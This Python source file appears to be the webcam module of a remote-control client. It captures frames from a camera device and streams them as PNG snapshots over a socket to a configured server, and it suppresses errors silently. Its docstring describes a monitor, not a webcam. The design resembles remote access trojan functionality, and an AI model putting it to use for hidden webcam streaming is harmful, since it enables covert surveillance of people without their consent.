'''
    Creates a connection to the server, sending a stream
    of snapshots from the specified monitor. Splitting
    up the work in to two threads, one for taking the
    snapshot, the other to send it.

    Verified: 2021 February 6
    * Follows PEP8
    * Tested Platforms
        * Windows 10
    * Third Party Modules
        * mss
'''

from client.modules.module import Module
from client.state import ClientStatic
from shared.helper import Helper
from shared.state import Static
from shared.error import Error
from shared.data import Data

import mss.tools
import socket
import queue
import mss


class Capture:

    def __init__(self, device):
        self.__device = device
        self.__alive = True

    @property
    def device(self):
        return self.__device

    @property
    def alive(self):
        return self.__alive

    def kill(self):
        self.__alive = False


class Webcam(Module):

    __MAX_SIZE = 1

    def __init__(self, token):
        super().__init__(token)
        self.__queue = queue.Queue(Webcam.__MAX_SIZE)
        self.__device = ClientStatic.WEBCAM[token]

    @Error.quiet
    def __del__(self):
        self.__device.kill()

    @Error.quiet_thread
    def __grab(self):
        while True:
            buffer, width, height = self.__device.device.getbuffer()
            snapshot = mss.tools.to_png(buffer, (width, height))
            self.__queue.put(snapshot,
                             timeout=Static.LIVE_TIMEOUT)

    @Error.quiet_thread
    def __send(self):
        with socket.create_connection(
                (Static.IP, Static.PORT)) as sock:
            Data.send(sock, self.token)
            Data.recv(sock)

            while True:
                Data.send(sock, self.__queue.get(
                    timeout=Static.LIVE_TIMEOUT), False)
                Data.recv(sock)

    def live(self):
        Helper.thread(self.__send)
        Helper.thread(self.__grab)
